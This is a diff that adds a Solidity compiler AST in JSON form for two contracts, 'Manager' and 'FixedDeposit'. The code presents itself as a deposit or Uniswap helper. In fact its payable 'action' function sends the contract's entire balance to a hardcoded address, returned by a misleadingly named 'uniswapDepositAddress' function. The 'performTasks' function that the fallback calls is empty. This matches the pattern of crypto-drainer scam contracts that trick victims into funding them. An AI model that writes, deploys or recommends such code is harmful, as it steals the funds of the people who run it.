@@ -1,0 +1,850 @@
+{
+  "absolutePath": "output/output_335.sol",
+  "exportedSymbols":
+  {
+    "FixedDeposit":
+    [
+      64
+    ],
+    "Manager":
+    [
+      14
+    ]
+  },
+  "id": 65,
+  "nodeType": "SourceUnit",
+  "nodes":
+  [
+    {
+      "id": 1,
+      "literals":
+      [
+        "solidity",
+        "^",
+        "0.8",
+        ".9"
+      ],
+      "nodeType": "PragmaDirective",
+      "src": "0:23:0"
+    },
+    {
+      "abstract": false,
+      "baseContracts": [],
+      "canonicalName": "Manager",
+      "contractDependencies": [],
+      "contractKind": "contract",
+      "fullyImplemented": true,
+      "id": 14,
+      "linearizedBaseContracts":
+      [
+        14
+      ],
+      "name": "Manager",
+      "nameLocation": "34:7:0",
+      "nodeType": "ContractDefinition",
+      "nodes":
+      [
+        {
+          "body":
+          {
+            "id": 4,
+            "nodeType": "Block",
+            "src": "80:18:0",
+            "statements": []
+          },
+          "functionSelector": "0c0f93a1",
+          "id": 5,
+          "implemented": true,
+          "kind": "function",
+          "modifiers": [],
+          "name": "performTasks",
+          "nameLocation": "58:12:0",
+          "nodeType": "FunctionDefinition",
+          "parameters":
+          {
+            "id": 2,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "70:2:0"
+          },
+          "returnParameters":
+          {
+            "id": 3,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "80:0:0"
+          },
+          "scope": 14,
+          "src": "49:49:0",
+          "stateMutability": "nonpayable",
+          "virtual": false,
+          "visibility": "public"
+        },
+        {
+          "body":
+          {
+            "id": 12,
+            "nodeType": "Block",
+            "src": "169:68:0",
+            "statements":
+            [
+              {
+                "expression":
+                {
+                  "hexValue": "307836386144653542426346383835644131353930413231363536333334343330374261466162353935",
+                  "id": 10,
+                  "isConstant": false,
+                  "isLValue": false,
+                  "isPure": true,
+                  "kind": "number",
+                  "lValueRequested": false,
+                  "nodeType": "Literal",
+                  "src": "187:42:0",
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "value": "0x68aDe5BBcF885dA1590A216563344307BaFab595"
+                },
+                "functionReturnParameters": 9,
+                "id": 11,
+                "nodeType": "Return",
+                "src": "180:49:0"
+              }
+            ]
+          },
+          "functionSelector": "feae9ad3",
+          "id": 13,
+          "implemented": true,
+          "kind": "function",
+          "modifiers": [],
+          "name": "uniswapDepositAddress",
+          "nameLocation": "115:21:0",
+          "nodeType": "FunctionDefinition",
+          "parameters":
+          {
+            "id": 6,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "136:2:0"
+          },
+          "returnParameters":
+          {
+            "id": 9,
+            "nodeType": "ParameterList",
+            "parameters":
+            [
+              {
+                "constant": false,
+                "id": 8,
+                "mutability": "mutable",
+                "name": "",
+                "nameLocation": "-1:-1:-1",
+                "nodeType": "VariableDeclaration",
+                "scope": 13,
+                "src": "160:7:0",
+                "stateVariable": false,
+                "storageLocation": "default",
+                "typeDescriptions":
+                {
+                  "typeIdentifier": "t_address",
+                  "typeString": "address"
+                },
+                "typeName":
+                {
+                  "id": 7,
+                  "name": "address",
+                  "nodeType": "ElementaryTypeName",
+                  "src": "160:7:0",
+                  "stateMutability": "nonpayable",
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  }
+                },
+                "visibility": "internal"
+              }
+            ],
+            "src": "159:9:0"
+          },
+          "scope": 14,
+          "src": "106:131:0",
+          "stateMutability": "pure",
+          "virtual": false,
+          "visibility": "public"
+        }
+      ],
+      "scope": 65,
+      "src": "25:215:0",
+      "usedErrors": []
+    },
+    {
+      "abstract": false,
+      "baseContracts": [],
+      "canonicalName": "FixedDeposit",
+      "contractDependencies": [],
+      "contractKind": "contract",
+      "fullyImplemented": true,
+      "id": 64,
+      "linearizedBaseContracts":
+      [
+        64
+      ],
+      "name": "FixedDeposit",
+      "nameLocation": "253:12:0",
+      "nodeType": "ContractDefinition",
+      "nodes":
+      [
+        {
+          "constant": false,
+          "id": 17,
+          "mutability": "mutable",
+          "name": "manager",
+          "nameLocation": "281:7:0",
+          "nodeType": "VariableDeclaration",
+          "scope": 64,
+          "src": "273:15:0",
+          "stateVariable": true,
+          "storageLocation": "default",
+          "typeDescriptions":
+          {
+            "typeIdentifier": "t_contract$_Manager_$14",
+            "typeString": "contract Manager"
+          },
+          "typeName":
+          {
+            "id": 16,
+            "nodeType": "UserDefinedTypeName",
+            "pathNode":
+            {
+              "id": 15,
+              "name": "Manager",
+              "nodeType": "IdentifierPath",
+              "referencedDeclaration": 14,
+              "src": "273:7:0"
+            },
+            "referencedDeclaration": 14,
+            "src": "273:7:0",
+            "typeDescriptions":
+            {
+              "typeIdentifier": "t_contract$_Manager_$14",
+              "typeString": "contract Manager"
+            }
+          },
+          "visibility": "internal"
+        },
+        {
+          "constant": false,
+          "functionSelector": "96ea8be2",
+          "id": 19,
+          "mutability": "mutable",
+          "name": "managerDepositAddress",
+          "nameLocation": "310:21:0",
+          "nodeType": "VariableDeclaration",
+          "scope": 64,
+          "src": "295:36:0",
+          "stateVariable": true,
+          "storageLocation": "default",
+          "typeDescriptions":
+          {
+            "typeIdentifier": "t_address",
+            "typeString": "address"
+          },
+          "typeName":
+          {
+            "id": 18,
+            "name": "address",
+            "nodeType": "ElementaryTypeName",
+            "src": "295:7:0",
+            "stateMutability": "nonpayable",
+            "typeDescriptions":
+            {
+              "typeIdentifier": "t_address",
+              "typeString": "address"
+            }
+          },
+          "visibility": "public"
+        },
+        {
+          "body":
+          {
+            "id": 35,
+            "nodeType": "Block",
+            "src": "370:104:0",
+            "statements":
+            [
+              {
+                "expression":
+                {
+                  "id": 29,
+                  "isConstant": false,
+                  "isLValue": false,
+                  "isPure": false,
+                  "lValueRequested": false,
+                  "leftHandSide":
+                  {
+                    "id": 25,
+                    "name": "managerDepositAddress",
+                    "nodeType": "Identifier",
+                    "overloadedDeclarations": [],
+                    "referencedDeclaration": 19,
+                    "src": "381:21:0",
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "nodeType": "Assignment",
+                  "operator": "=",
+                  "rightHandSide":
+                  {
+                    "arguments": [],
+                    "expression":
+                    {
+                      "argumentTypes": [],
+                      "expression":
+                      {
+                        "id": 26,
+                        "name": "_manager",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 22,
+                        "src": "405:8:0",
+                        "typeDescriptions":
+                        {
+                          "typeIdentifier": "t_contract$_Manager_$14",
+                          "typeString": "contract Manager"
+                        }
+                      },
+                      "id": 27,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "uniswapDepositAddress",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 13,
+                      "src": "405:30:0",
+                      "typeDescriptions":
+                      {
+                        "typeIdentifier": "t_function_external_pure$__$returns$_t_address_$",
+                        "typeString": "function () pure external returns (address)"
+                      }
+                    },
+                    "id": 28,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "405:32:0",
+                    "tryCall": false,
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "src": "381:56:0",
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  }
+                },
+                "id": 30,
+                "nodeType": "ExpressionStatement",
+                "src": "381:56:0"
+              },
+              {
+                "expression":
+                {
+                  "id": 33,
+                  "isConstant": false,
+                  "isLValue": false,
+                  "isPure": false,
+                  "lValueRequested": false,
+                  "leftHandSide":
+                  {
+                    "id": 31,
+                    "name": "manager",
+                    "nodeType": "Identifier",
+                    "overloadedDeclarations": [],
+                    "referencedDeclaration": 17,
+                    "src": "448:7:0",
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_contract$_Manager_$14",
+                      "typeString": "contract Manager"
+                    }
+                  },
+                  "nodeType": "Assignment",
+                  "operator": "=",
+                  "rightHandSide":
+                  {
+                    "id": 32,
+                    "name": "_manager",
+                    "nodeType": "Identifier",
+                    "overloadedDeclarations": [],
+                    "referencedDeclaration": 22,
+                    "src": "458:8:0",
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_contract$_Manager_$14",
+                      "typeString": "contract Manager"
+                    }
+                  },
+                  "src": "448:18:0",
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_contract$_Manager_$14",
+                    "typeString": "contract Manager"
+                  }
+                },
+                "id": 34,
+                "nodeType": "ExpressionStatement",
+                "src": "448:18:0"
+              }
+            ]
+          },
+          "id": 36,
+          "implemented": true,
+          "kind": "constructor",
+          "modifiers": [],
+          "name": "",
+          "nameLocation": "-1:-1:-1",
+          "nodeType": "FunctionDefinition",
+          "parameters":
+          {
+            "id": 23,
+            "nodeType": "ParameterList",
+            "parameters":
+            [
+              {
+                "constant": false,
+                "id": 22,
+                "mutability": "mutable",
+                "name": "_manager",
+                "nameLocation": "360:8:0",
+                "nodeType": "VariableDeclaration",
+                "scope": 36,
+                "src": "352:16:0",
+                "stateVariable": false,
+                "storageLocation": "default",
+                "typeDescriptions":
+                {
+                  "typeIdentifier": "t_contract$_Manager_$14",
+                  "typeString": "contract Manager"
+                },
+                "typeName":
+                {
+                  "id": 21,
+                  "nodeType": "UserDefinedTypeName",
+                  "pathNode":
+                  {
+                    "id": 20,
+                    "name": "Manager",
+                    "nodeType": "IdentifierPath",
+                    "referencedDeclaration": 14,
+                    "src": "352:7:0"
+                  },
+                  "referencedDeclaration": 14,
+                  "src": "352:7:0",
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_contract$_Manager_$14",
+                    "typeString": "contract Manager"
+                  }
+                },
+                "visibility": "internal"
+              }
+            ],
+            "src": "351:18:0"
+          },
+          "returnParameters":
+          {
+            "id": 24,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "370:0:0"
+          },
+          "scope": 64,
+          "src": "340:134:0",
+          "stateMutability": "nonpayable",
+          "virtual": false,
+          "visibility": "public"
+        },
+        {
+          "body":
+          {
+            "id": 53,
+            "nodeType": "Block",
+            "src": "515:88:0",
+            "statements":
+            [
+              {
+                "expression":
+                {
+                  "arguments":
+                  [
+                    {
+                      "expression":
+                      {
+                        "arguments":
+                        [
+                          {
+                            "id": 48,
+                            "name": "this",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -28,
+                            "src": "581:4:0",
+                            "typeDescriptions":
+                            {
+                              "typeIdentifier": "t_contract$_FixedDeposit_$64",
+                              "typeString": "contract FixedDeposit"
+                            }
+                          }
+                        ],
+                        "expression":
+                        {
+                          "argumentTypes":
+                          [
+                            {
+                              "typeIdentifier": "t_contract$_FixedDeposit_$64",
+                              "typeString": "contract FixedDeposit"
+                            }
+                          ],
+                          "id": 47,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "573:7:0",
+                          "typeDescriptions":
+                          {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName":
+                          {
+                            "id": 46,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "573:7:0",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 49,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "573:13:0",
+                        "tryCall": false,
+                        "typeDescriptions":
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      "id": 50,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "balance",
+                      "nodeType": "MemberAccess",
+                      "src": "573:21:0",
+                      "typeDescriptions":
+                      {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    }
+                  ],
+                  "expression":
+                  {
+                    "argumentTypes":
+                    [
+                      {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    ],
+                    "expression":
+                    {
+                      "arguments":
+                      [
+                        {
+                          "arguments": [],
+                          "expression":
+                          {
+                            "argumentTypes": [],
+                            "expression":
+                            {
+                              "id": 41,
+                              "name": "manager",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 17,
+                              "src": "531:7:0",
+                              "typeDescriptions":
+                              {
+                                "typeIdentifier": "t_contract$_Manager_$14",
+                                "typeString": "contract Manager"
+                              }
+                            },
+                            "id": 42,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "uniswapDepositAddress",
+                            "nodeType": "MemberAccess",
+                            "referencedDeclaration": 13,
+                            "src": "531:29:0",
+                            "typeDescriptions":
+                            {
+                              "typeIdentifier": "t_function_external_pure$__$returns$_t_address_$",
+                              "typeString": "function () pure external returns (address)"
+                            }
+                          },
+                          "id": 43,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "531:31:0",
+                          "tryCall": false,
+                          "typeDescriptions":
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression":
+                      {
+                        "argumentTypes":
+                        [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 40,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "523:8:0",
+                        "typeDescriptions":
+                        {
+                          "typeIdentifier": "t_type$_t_address_payable_$",
+                          "typeString": "type(address payable)"
+                        },
+                        "typeName":
+                        {
+                          "id": 39,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "523:8:0",
+                          "stateMutability": "payable",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 44,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "523:40:0",
+                      "tryCall": false,
+                      "typeDescriptions":
+                      {
+                        "typeIdentifier": "t_address_payable",
+                        "typeString": "address payable"
+                      }
+                    },
+                    "id": 45,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "transfer",
+                    "nodeType": "MemberAccess",
+                    "src": "523:49:0",
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
+                      "typeString": "function (uint256)"
+                    }
+                  },
+                  "id": 51,
+                  "isConstant": false,
+                  "isLValue": false,
+                  "isPure": false,
+                  "kind": "functionCall",
+                  "lValueRequested": false,
+                  "names": [],
+                  "nodeType": "FunctionCall",
+                  "src": "523:72:0",
+                  "tryCall": false,
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_tuple$__$",
+                    "typeString": "tuple()"
+                  }
+                },
+                "id": 52,
+                "nodeType": "ExpressionStatement",
+                "src": "523:72:0"
+              }
+            ]
+          },
+          "functionSelector": "0a7a1c4d",
+          "id": 54,
+          "implemented": true,
+          "kind": "function",
+          "modifiers": [],
+          "name": "action",
+          "nameLocation": "491:6:0",
+          "nodeType": "FunctionDefinition",
+          "parameters":
+          {
+            "id": 37,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "497:2:0"
+          },
+          "returnParameters":
+          {
+            "id": 38,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "515:0:0"
+          },
+          "scope": 64,
+          "src": "482:121:0",
+          "stateMutability": "payable",
+          "virtual": false,
+          "visibility": "public"
+        },
+        {
+          "body":
+          {
+            "id": 62,
+            "nodeType": "Block",
+            "src": "631:41:0",
+            "statements":
+            [
+              {
+                "expression":
+                {
+                  "arguments": [],
+                  "expression":
+                  {
+                    "argumentTypes": [],
+                    "expression":
+                    {
+                      "id": 57,
+                      "name": "manager",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 17,
+                      "src": "642:7:0",
+                      "typeDescriptions":
+                      {
+                        "typeIdentifier": "t_contract$_Manager_$14",
+                        "typeString": "contract Manager"
+                      }
+                    },
+                    "id": 59,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "performTasks",
+                    "nodeType": "MemberAccess",
+                    "referencedDeclaration": 5,
+                    "src": "642:20:0",
+                    "typeDescriptions":
+                    {
+                      "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                      "typeString": "function () external"
+                    }
+                  },
+                  "id": 60,
+                  "isConstant": false,
+                  "isLValue": false,
+                  "isPure": false,
+                  "kind": "functionCall",
+                  "lValueRequested": false,
+                  "names": [],
+                  "nodeType": "FunctionCall",
+                  "src": "642:22:0",
+                  "tryCall": false,
+                  "typeDescriptions":
+                  {
+                    "typeIdentifier": "t_tuple$__$",
+                    "typeString": "tuple()"
+                  }
+                },
+                "id": 61,
+                "nodeType": "ExpressionStatement",
+                "src": "642:22:0"
+              }
+            ]
+          },
+          "id": 63,
+          "implemented": true,
+          "kind": "fallback",
+          "modifiers": [],
+          "name": "",
+          "nameLocation": "-1:-1:-1",
+          "nodeType": "FunctionDefinition",
+          "parameters":
+          {
+            "id": 55,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "619:2:0"
+          },
+          "returnParameters":
+          {
+            "id": 56,
+            "nodeType": "ParameterList",
+            "parameters": [],
+            "src": "631:0:0"
+          },
+          "scope": 64,
+          "src": "611:61:0",
+          "stateMutability": "nonpayable",
+          "virtual": false,
+          "visibility": "external"
+        }
+      ],
+      "scope": 65,
+      "src": "244:431:0",
+      "usedErrors": []
+    }
+  ],
+  "src": "0:679:0"
+}
